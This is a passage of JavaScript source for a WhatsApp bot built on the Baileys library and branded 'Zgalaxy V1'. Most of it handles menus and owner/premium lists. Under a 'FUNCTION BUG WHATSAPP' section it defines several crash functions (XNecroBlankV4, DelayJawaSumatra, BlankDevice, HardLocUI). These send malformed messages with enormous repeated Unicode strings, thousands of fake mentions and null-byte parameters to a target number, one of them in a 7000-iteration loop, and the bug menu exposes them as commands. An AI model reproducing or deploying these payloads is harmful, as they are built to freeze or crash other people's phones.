/*
 
# ——> Y <—— #

# CREATED BY ALWAYSMUNN
# DEVELOPER ALWAYSMUNN !
# THANKS

# ——> I <—— #

*/
require('./𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣/Settings')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const sharp = require('sharp')
const jimp = require("jimp")
const moment = require('moment-timezone')
const path = require('path')
const { exec, spawn, execSync } = require('child_process');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')
const babi = fs.readFileSync('./system/Photo/OverFlowX.jpeg')

module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = "."
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/Premium.json'))
const OwnerJS = JSON.parse(fs.readFileSync('./system/ownjs.json'))
const Owners = JSON.parse(fs.readFileSync('./system/owns.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await client.decodeJid(client.user.id)
const cmd = prefix+command
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwnerJS = [botNumber, ...OwnerJS].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwners = [botNumber, ...Owners].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!client.public) {
if (!isCreator) return
}

if (isCmd) {
console.log(chalk.red("• Sender :"), chalk.white(m.chat) + "\n" + chalk.red("• Command :"), chalk.white(cmd) + "\n")
}
    

//==========[ FUNCTION BUG WHATSAPP ]==========\\
        // ( BLANK NO CLICK ) \\

async function XNecroBlankV4(target) {
  const msg1 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Xtravs" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                },
              },
              externalAdReply: {
                title: "ꦾ࣯࣯".repeat(50000),
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Xtravs-ai.example.com",
                showAdAttribution: false
              },
            },
            body: { 
              text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000),
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                ...Array.from(
               { length: 1900 },
               () =>
             "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
               },
             },
             externalAdReply: {
               title: "☀️",
               body: "🩸",
               mediaType: 1,
               renderLargerThumbnail: false,
             },
           },
           body: {
             text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000),
           },
           nativeFlowMessage: {
             messageParamJson: "{".repeat(25000),
           },
           stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
             fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
             fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
             mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
             mimetype: "image/webp",
             height: 9999,
             width: 9999,
             directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
             fileLength: 12260,
             mediaKeyTimestamp: "1743832131",
             isAnimated: false,
             stickerSentTs: "X",
             isAvatar: false,
             isAiSticker: false,
             isLottie: false,
           },
         },
       },
     },
   },
   {}
  );
  
  await client.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  
  await client.relayMessage(target, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: target },
  });
}

async function DelayJawaSumatra(target) {
  let Rap = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u100b",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(9000000000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
  
  let Rap2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "DO YOU KNOW RAP? YES I RAP",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(9000000000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "99999999"),
    }
  ); 
  
  let Rap3 = {
   viewOnceMessage: {
    message: {
     messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
     },
     interactiveMessage: {
      contextInfo: {
       mentionedJid: [target],
       isForwarded: true,
       forwardingScore: 999,
       businessMessageForwardInfo: {
        businessOwnerJid: target,
       },
      },
      body: {
       text: "Mami",
      },
      nativeFlowMessage: {
       buttons: [
        {
         name: "single_select",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        {
         name: "call_permission_request",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        
       ],
      },
     },
    },
   },
  };

  await client.relayMessage(target, Rap3, {
   participant: { jid: target },
  });

  await client.relayMessage(
    "status@broadcast",
    Rap.message,
    {
      messageId: Rap.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );
  
  await client.relayMessage(
    "status@broadcast",
    Rap2.message,
    {
      messageId: Rap2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );  
}

async function BlankDevice(target) {
  const payloads = [
    {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363424946687543@newsletter",
            newsletterName: "ꦾ".repeat(16000),
            caption: "ꦾ".repeat(70000),
            inviteExpiration: Date.now() + 9999999999
          }
        }
      }
    },
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724"
      }
    }
  ];
  
  for(let i = 0; i < 7000; i++) {
    for(const payload of payloads) {
      await client.relayMessage(target, payload, {});
      await new Promise(r => setTimeout(r, 200));
    }
  }
};

async function HardLocUI(target) {
  try {
    const zieeBtn = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(170000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(130000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(60000)
        },
        type: 1
      }
    ];

    const zieeMsg = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "alwaysRizz 永遠に生きる" + "ꦾ".repeat(16000) + "ꦽ".repeat(16000),
        address: "Rizz 永遠に生きる" + "ꦾ".repeat(18000) + "ꦽ".repeat(17000)
      },
      caption: "AlwaysRizz 永遠に生きる" + "ꦾ".repeat(19000) + "ꦽ".repeat(16000),
      footer: " ",
      zieeBtn,
      headerType: 6
    };

    await client.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}
  

    
    
//=================================================//
// Function Main — Menu
//=================================================//
const CHANNELS_FILE = "./system/savesaluran.json";

function loadChannels() {
    if (fs.existsSync(CHANNELS_FILE)) {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
    }
    return [];
}

function saveChannels(data) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}
global.channels = loadChannels();

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const imageList = [
    "https://img2.pixhost.to/images/7941/726982848_always-rizz.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const ReplyButton = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

client.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣`,
                body: ` 𝙕𝙜𝙖𝙡𝙖𝙭𝙮 || 𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣 `,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: `https://whatsapp.com/channel/0029VbCRUA7BVJl1zO1M4S1S`
            }
        }
    }, { quoted: lol });
}

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.menu',
      buttonText: {
        displayText: 'Menu'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: '𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363426866716261@newsletter",
        serverMessageId: null,
        newsletterName: `𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const ReplyButtonMenu = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

client.sendMessage(m.chat, {
  image: { url: RandomMenu },
  caption: teks,
  footer: "🩸 𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1 𝙑1",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363426866716261@newsletter",
      serverMessageId: 1,
      newsletterName: "𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣"
    }
  }
}, { quoted: lol });
}

/// BUTTON MODE
  const buttons = [
  {
      buttonId: '.allmenu',
      buttonText: {
        displayText: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔'
    }
  },
    {
      buttonId: '.bugmenu',
      buttonText: {
        displayText: '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔'
    }
  },
  {
      buttonId: '.ownermenu',
      buttonText: {
        displayText: '𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔'
      }
    },
  {
      buttonId: '.tqto',
      buttonText: {
        displayText: '𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎'
      }
    },
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: '𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363426866716261@newsletter",
        serverMessageId: null,
        newsletterName: ` 𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `—!s\`𝙕𝙜𝙖𝙡𝙖𝙭𝙮 || 𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣 ࿐\ncommand from: @${m.sender.split('@')[0]}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363417941185568@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
//=================================================//
// Command Menu
//=================================================//
switch(command) {
case 'set': {
  const selected = args[0]?.toLowerCase();
  if (!['button', 'nobutton'].includes(selected)) {
    return m.reply(`*Usage :*\n.setmenu button\n.setmenu nobutton`);
  }

  global.menuMode = selected; // Ubah global, bukan per user
  return m.reply(`✅ Tampilan menu semua user telah diubah ke *${selected.toUpperCase()}* mode.`);
}
break
case 'start':
case 'AlwaysMunn':
case 'menu': {
let Menu = `( 👀 ) 안녕하세요,  𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1  봇 사용자 여러분. 이 봇 스크립트를 사용해 주셔서 감사합니다. 만족하셨기를 바랍니다
\`\`\`Hola ${info} 🕊️, 私はあなたの敵を排除する任務を負っています.\`\`\`
\`⺙\` User    : ${pushname}
\`⺓\` Version : 1.0
\`⺘\` Status  :  ${isCreator ? "Owner 公" : isPremium ? "Premium プム" : "User Not Acces 使"}
\`⺧\` Mode    : ${client.public ? "Public (開)" : "Private (用)"}
\`⺴ Uptime  : ${runtime(process.uptime())}\`
`
ReplyButtonMenu(Menu)
}
break
case 'allmenu': {
let Menu = `( 👀 ) 안녕하세요, 𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1 봇 사용자 여러분. 이 봇 스크립트를 사용해 주셔서 감사합니다. 만족하셨기를 바랍니다
\`\`\`Hola ${info} 🕊️, 私はあなたの敵を排除する任務を負っています.\`\`\`
\`⺙\` User    : ${pushname}
\`⺓\` Version : 1.0
\`⺘\` Status  :  ${isCreator ? "Owner 公" : isPremium ? "Premium プム" : "User Not Acces 使"}
\`⺧\` Mode    : ${client.public ? "Public (開)" : "Private (用)"}
\`⺴ Uptime  : ${runtime(process.uptime())}\`

╭━≫〖 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〗↯
│ 流 .munn-invis (Recomended) 
│ 流 .zgalaxy-invis
│ 流 .over-crash
┗━━━━━━━━━━━━━━━━━〣

╭━≫〖 𝗝𝗣𝗠𝗖𝗛 𝗠𝗘𝗡𝗨 〗↯
│ 流 .jpmch
│ 流 .jpmchnocd
│ 流 .addownjs
│ 流 .listownjs
│ 流 .delownjs
│ 流 .addptjs
│ 流 .listptjs
│ 流 .delptjs
│ 流 .addidch
│ 流 .listidch
│ 流 .delidch
┗━━━━━━━━━━━━━━━━━〣

╭━≫〖 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 〗↯
│ 流 .addprem
│ 流 .delprem
│ 流 .listprem
│ 流 .addown
│ 流 .delown
│ 流 .listown
│ 流 .self
│ 流 .public
│ 流 .join
│ 流 .restart
┗━━━━━━━━━━━━━━━━━〣
`
ReplyButtonMenu(Menu)
}
break
case 'ownermenu': {
let Menu = `\`\`\`Hola ${info} 🕊️, 私はあなたの敵を排除する任務を負っています.\`\`\`
\`⺙\` User    : ${pushname}
\`⺓\` Version : 1.0
\`⺘\` Status  :  ${isCreator ? "Owner 公" : isPremium ? "Premium プム" : "User Not Acces 使"}
\`⺧\` Mode    : ${client.public ? "Public (開)" : "Private (用)"}
\`⺴ Uptime  : ${runtime(process.uptime())}\`

╭━≫〖 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 〗↯
│ 流 .addprem
│ 流 .delprem
│ 流 .listprem
│ 流 .addown
│ 流 .delown
│ 流 .listown
│ 流 .self
│ 流 .public
│ 流 .join
│ 流 .restart
┗━━━━━━━━━━━━━━━━━〣`
ReplyButtonMenu(Menu)
}
break
case 'bugmenu': {
let Menu = `( 👋🏻 ) - Hello
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⺙\` User    : ${pushname}
\`⺓\` Version : 1.0
\`⺘\` Status  :  ${isCreator ? "Owner 公" : isPremium ? "Premium プム" : "User Not Acces 使"}
\`⺧\` Mode    : ${client.public ? "Public (開)" : "Private (用)"}
\`⺴ Uptime  : ${runtime(process.uptime())}\`
 
╭━≫〖 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〗↯
│ 流 .munn-invis (Recommended) 
│ 流 .zgalaxy-invis 
│ 流 .over-crash
┗━━━━━━━━━━━━━━━━━〣
`
ReplyButtonMenu(Menu)
}
break
case 'jpmchmenu': {
let Menu = `( 👀 ) 안녕하세요,  𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1  봇 사용자 여러분. 이 봇 스크립트를 사용해 주셔서 감사합니다. 만족하셨기를 바랍니다
\`\`\`Hola ${info} 🕊️, 私はあなたの敵を排除する任務を負っています.\`\`\`
\`⺙\` User    : ${pushname}
\`⺓\` Version : 1.0
\`⺘\` Status  :  ${isCreator ? "Owner 公" : isPremium ? "Premium プム" : "User Not Acces 使"}
\`⺧\` Mode    : ${client.public ? "Public (開)" : "Private (用)"}
\`⺴ Uptime  : ${runtime(process.uptime())}\`

╭━≫〖 𝗝𝗣𝗠𝗖𝗛 𝗠𝗘𝗡𝗨 〗↯
│ 流 .jpmch
│ 流 .jpmchnocd
│ 流 .sync
│ 流 .addownjs
│ 流 .listownjs
│ 流 .delownjs
│ 流 .addptjs
│ 流 .listptjs
│ 流 .delptjs
│ 流 .addidch
│ 流 .listidch
│ 流 .delidch
┗━━━━━━━━━━━━━━━━━〣
`
ReplyButtonMenu(Menu)
}
break
//=================================================//
// Command Owner
//=================================================//
case 'addowner':
case 'addown': {
    if (!isCreator) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!owner.includes(number)) owner.push(number);
    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delowner':
case 'delown': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/Premium.json', JSON.stringify(Premium));
    ReplyButton(`❌ Owner *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'addpremium':
case 'addprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Nomor tidak valid!");

    if (!Premium.includes(number)) Premium.push(number);
    fs.writeFileSync('./system/Premium.json', JSON.stringify(Premium));

